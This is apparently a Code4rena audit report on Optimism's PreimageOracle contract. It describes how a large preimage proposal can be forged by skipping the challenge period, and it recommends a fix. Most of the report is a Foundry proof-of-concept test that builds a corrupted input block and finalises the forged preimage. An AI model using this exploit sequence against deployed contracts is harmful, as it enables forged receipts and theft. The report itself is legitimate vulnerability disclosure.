# #3: Large preimage proposal can be forged by bypassing challenge period
Labels: ['bug', '3 (High Risk)', 'satisfactory', 'sufficient quality report', ':robot:_13_group', 'duplicate-13']
Accepted: False

# Lines of code

https://github.com/code-423n4/2024-07-optimism/blob/2e11e15e7a9a86f90de090ebf9e3516279e30897/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L416-L693


# Vulnerability details

## Impact
An attacker can forge arbitrary LPPs by submitting an invalid state transition and bypassing the challenge period, preventing users from disputing the proposal. This can be used by an attacker to forge a receipt.

## Proof of Concept
Note that this PoC only supports manipulating an offset which is block-aligned, further work is needed to support manipulating an offset which crosses two blocks, but that is left as an exercise to the reader.

```
    function test_exploit_bypassChallengePeriod() public {
        // make sure we're using a realistic timestamp
        vm.warp(1721103748);

        // here is the original payload, this is the hash we want to collide
        bytes memory data = abi.encodePacked("Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.");

        // here is the offset we're interested in manipulating
        uint32 offset = 40;

        // here is the value we want to spoof
        bytes32 desiredValue = keccak256(abi.encodePacked("femboys"));

        /* BEGIN EXPLOIT */
        uint256 currentBlock = 0;

        // manually pad our data
        bytes memory paddedData = LibKeccak.padMemory(data);

        // initialize our request
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, offset + 8, uint32(data.length));

        // generate commitments
        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);

        // generate leaves
        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, data);

        // write as many input blocks until our offset
        {
            uint256 toBlock = offset / 136;
            if (toBlock - currentBlock > 0) {
                bytes memory slice = new bytes((toBlock - currentBlock) * 136);
                assembly {
                    pop(call(gas(), 0x04, 0x00, add(add(data, 0x20), mul(currentBlock, 136)), mload(slice), add(slice, 0x20), mload(slice)))
                }

                bytes32[] memory partialStateCommitments = new bytes32[](toBlock - currentBlock);
                for (uint256 i = 0; i < partialStateCommitments.length; i++) {
                    partialStateCommitments[i] = stateCommitments[currentBlock + i];
                }
                oracle.addLeavesLPP(TEST_UUID, currentBlock, slice, partialStateCommitments, false);
                
                currentBlock = toBlock;
            }
        }

        // write our corrupted block
        {
            bytes memory corrupted = new bytes(136);
            assembly {
                pop(call(gas(), 0x04, 0x00, add(add(data, 0x20), mul(currentBlock, 136)), mload(corrupted), add(corrupted, 0x20), mload(corrupted)))
                mstore(add(add(corrupted, 0x20), mod(offset, 136)), desiredValue)
            }
            leaves[currentBlock].input = corrupted;
            bytes32[] memory partialStateCommitments = new bytes32[](1);
            partialStateCommitments[0] = stateCommitments[currentBlock];
            oracle.addLeavesLPP(TEST_UUID, currentBlock, corrupted, partialStateCommitments, false);
            currentBlock++;
        }

        // write final blocks (with padding)
        {
            uint256 toBlock = paddedData.length / 136;
            if (toBlock - currentBlock > 0) {
                bytes memory slice = new bytes((toBlock - currentBlock) * 136);
                assembly {
                    pop(call(gas(), 0x04, 0x00, add(add(paddedData, 0x20), mul(currentBlock, 136)), mload(slice), add(slice, 0x20), mload(slice)))
                }

                bytes32[] memory partialStateCommitments = new bytes32[](toBlock - currentBlock);
                for (uint256 i = 0; i < partialStateCommitments.length; i++) {
                    partialStateCommitments[i] = stateCommitments[currentBlock + i];
                }
                oracle.addLeavesLPP(TEST_UUID, currentBlock, slice, partialStateCommitments, false);
                
                currentBlock = toBlock;
            }
        }

        // squeeze our payload
        {
            // generate the proofs
            (, bytes32[] memory preProof) = _generateProof(leaves.length - 2, leaves);
            (, bytes32[] memory postProof) = _generateProof(leaves.length - 1, leaves);

            // squeeze
            LibKeccak.StateMatrix memory preMatrix = _stateMatrixAtBlockIndex(data, leaves.length - 1);
            oracle.squeezeLPP({
                _claimant: address(this),
                _uuid: TEST_UUID,
                _stateMatrix: preMatrix,
                _preState: leaves[leaves.length - 2],
                _preStateProof: preProof,
                _postState: leaves[leaves.length - 1],
                _postStateProof: postProof
            });
        }

        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
        assertTrue(oracle.preimagePartOk(finalDigest, offset + 8));
        assertEq(oracle.preimageLengths(finalDigest), data.length);
        assertEq(oracle.preimageParts(finalDigest, offset + 8), desiredValue);
    }
```

## Tools Used
Programming socks

## Recommended Mitigation Steps
Restart the challenge period every time more leaves are added, or require that the user must explicitly finalize the proposal so that an attacker can't manually finalize by padding the input themselves.


## Assessed type

Error